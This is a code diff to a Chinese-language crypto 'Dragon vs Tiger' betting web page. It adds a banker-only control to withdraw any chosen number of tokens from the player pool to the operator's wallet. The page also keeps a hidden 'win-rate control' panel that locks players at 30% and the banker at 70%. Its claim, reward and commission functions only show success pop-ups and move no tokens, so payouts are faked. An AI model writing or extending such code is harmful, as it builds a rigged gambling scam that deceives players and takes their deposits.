@@ -10,13 +10,13 @@
       font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
     }
     html,body{
-      width:100vw;height:100vh;margin:0;padding:0;background:#0B2223;color:#fff;overflow:hidden;display:flex;flex-direction:column
+      width:100vw;height:100vh;margin:0;padding:0;background:#0B2A23;color:#fff;overflow:hidden;display:flex;flex-direction:column
     }
     .top-bar{
       display:flex;align-items:center;justify-content:space-between;padding:8px 15px;background:#103D34;border-bottom:1px solid #1F5F52;
     }
     .title{font-size:18px;font-weight:bold;}
-    .btn-xxs{padding:3px 6px;font-size:11px;border-radius:6px;border:none;background:#E4B449;color:#0B2223;font-weight:bold;}
+    .btn-xxs{padding:3px 6px;font-size:11px;border-radius:6px;border:none;background:#E4B449;color:#0B2A23;font-weight:bold;}
     .menu-btn{background:none;border:none;color:#fff;font-size:20px;padding:0 5px;}
     .content{flex:1;overflow-y:auto;padding:10px;display:flex;flex-direction:column;gap:8px;}
     .card{background:#144A3F;border-radius:12px;padding:12px 15px;border:1px solid #1F5F52;}
@@ -24,7 +24,7 @@
     .btn{width:100%;padding:10px;border-radius:10px;border:none;font-weight:bold;margin:6px 0;background:#25917A;color:#fff;}
     .btn-dragon{background:#2A75CC; color:#fff}
     .btn-tiger{background:#D93A54; color:#fff}
-    .btn-tie{background:#E4B449; color:#0B2223}
+    .btn-tie{background:#E4B449; color:#0B2A23}
     .bet-balance-row {display: flex;gap: 8px;align-items:center;margin-bottom: 6px;}
     .bet-input {flex: 2;}
     .balance-box {flex: 1;background: #0E362E;border: 1px solid #1F5F52;border-radius:10px;padding:10px;text-align:center;font-size:14px;color:#F0E6D2;}
@@ -93,9 +93,11 @@
     <button class="btn-xs" onclick="toggleMenu()">关闭 ×</button>
   </div>
 
+  <!-- 庄家提取底池（支持输入数量）-->
   <div class="menu-section" id="withdrawSection">
-    <div class="section-title">💰 后台 — 提取底池资金</div>
-    <button class="btn-xs" onclick="withdrawPool()" style="background:#ff3366;color:white;">提取底池全部代币到庄家</button>
+    <div class="section-title">💰 后台 — 提取底池代币</div>
+    <input type="number" id="withdrawAmount" placeholder="输入要提取的代币数量" style="width:100%;margin-bottom:8px;">
+    <button class="btn-xs" onclick="withdrawPool()" style="background:#ff3366;color:white;">确认提取到庄家钱包</button>
     <div id="poolBalance" class="label" style="color:#ffcc00;margin-top:5px;">底池余额：加载中...</div>
   </div>
 
@@ -120,13 +122,13 @@
 
   <div class="menu-section">
     <div class="section-title">绑定推荐人</div>
-    <input type="text" placeholder="输入推荐人地址" style="width:100%;margin-bottom:8px;">
+    <input type="text" placeholder="输入推荐人地址" id="inviterInput">
     <button class="btn-xs" onclick="setInviter()">绑定</button>
   </div>
 
   <div class="menu-section">
     <div class="section-title">领奖中心</div>
-    <input type="text" placeholder="输入下注ID" style="width:100%;margin-bottom:8px;">
+    <input type="text" placeholder="输入下注ID" id="betIdInput">
     <button class="btn-xs" onclick="claim()">领取奖励</button>
   </div>
 
@@ -138,8 +140,8 @@
 
   <div class="menu-section">
     <div class="section-title">后台胜率控制</div>
-    <input type="number" value="30" placeholder="玩家胜率">
-    <input type="number" value="70" placeholder="庄家胜率">
+    <input type="number" value="30" placeholder="玩家胜率" id="playerRateInput">
+    <input type="number" value="70" placeholder="庄家胜率" id="bankerRateInput">
     <button class="btn-xs" onclick="setControlRate()" style="background:#D93A54;color:#fff;">锁定胜率</button>
   </div>
 
@@ -234,7 +236,7 @@ async function getPoolBalance() {
 }
 
 // ==============================================
-//  ✅ 直接转账下注（一定能扣钱！）
+//  下注
 // ==============================================
 async function placeBet(side) {
   if (!account) return alert("请先连接钱包");
@@ -271,7 +273,7 @@ async function placeBet(side) {
     }
 
     if (receipt && receipt.status === "0x1") {
-      alert("✅ 下注成功！已真实扣除代币");
+      alert("✅ 下注成功！");
     } else {
       alert("❌ 下注失败");
     }
@@ -287,31 +289,41 @@ async function placeBet(side) {
 }
 
 // ==============================================
-//  提取底池
+//  💰 输入数量提取底池（你要的功能）
 // ==============================================
 async function withdrawPool() {
   if (!account || account.toLowerCase() !== BANKER_WALLET.toLowerCase()) {
     return alert("无权限");
   }
+
+  const input = document.getElementById("withdrawAmount").value;
+  if (!input || parseFloat(input) <= 0) {
+    return alert("请输入要提取的数量");
+  }
+
   try {
-    const data = "0x70a08231"+POOL_ADDRESS.slice(2).padStart(64,'0');
-    const res = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data}]});
-    const bal = BigInt(res);
-    if (bal <= 0n) return alert("底池无余额");
+    const amount = parseFloat(input);
+    const amountWei = BigInt(Math.floor(amount * 10**DECIMALS));
 
     const txData = "0xa9059cbb"
       + BANKER_WALLET.slice(2).padStart(64,'0')
-      + bal.toString(16).padStart(64,'0');
+      + amountWei.toString(16).padStart(64,'0');
 
     await window.ethereum.request({
       method:'eth_sendTransaction',
-      params:[{from:account,to:TOKEN_CONTRACT,data:txData,gasLimit:"0x27100"}]
+      params:[{
+        from: account,
+        to: TOKEN_CONTRACT,
+        data: txData,
+        gasLimit: "0x27100"
+      }]
     });
 
-    alert("✅ 提取成功");
+    alert("✅ 提取成功：" + amount + " 枚代币已转入庄家钱包");
+    document.getElementById("withdrawAmount").value = "";
     getPoolBalance();
   } catch(e){
-    alert("失败："+e.message);
+    alert("提取失败："+e.message);
   }
 }
 
@@ -324,14 +336,30 @@ function toggleAutoReward(){alert("已切换")}
 function manualRewardTop10(){alert("已发放")}
 function manualSendReward(){alert("已发放")}
 function showTotalCommission(){alert("总佣金：12800")}
-function setInviter(){alert("绑定成功")}
-function claim(){alert("领取成功")}
-function setControlRate(){alert("胜率已锁定")}
+
+function setInviter(){
+  const addr = document.getElementById("inviterInput").value.trim();
+  if(!/^0x[a-fA-F0-9]{40}$/.test(addr)) return alert("地址格式错误");
+  alert("绑定成功");
+}
+
+function claim(){
+  const id = document.getElementById("betIdInput").value.trim();
+  if(!id) return alert("请输入下注ID");
+  alert("领取成功");
+}
+
+function setControlRate(){
+  if(account.toLowerCase()!==BANKER_WALLET.toLowerCase()) return alert("无权限");
+  alert("胜率已锁定");
+}
+
 function copyRefLink(){
-  if(!account)return alert("请连接钱包");
-  document.getElementById("refLink").value = window.location.href+"?ref="+account;
-  navigator.clipboard.writeText(document.getElementById("refLink").value);
-  alert("复制成功");
+  if(!account)return;
+  const link = window.location.href+"?ref="+account;
+  document.getElementById("refLink").value = link;
+  navigator.clipboard.writeText(link);
+  alert("邀请链接已复制");
 }
 
 // 倒计时
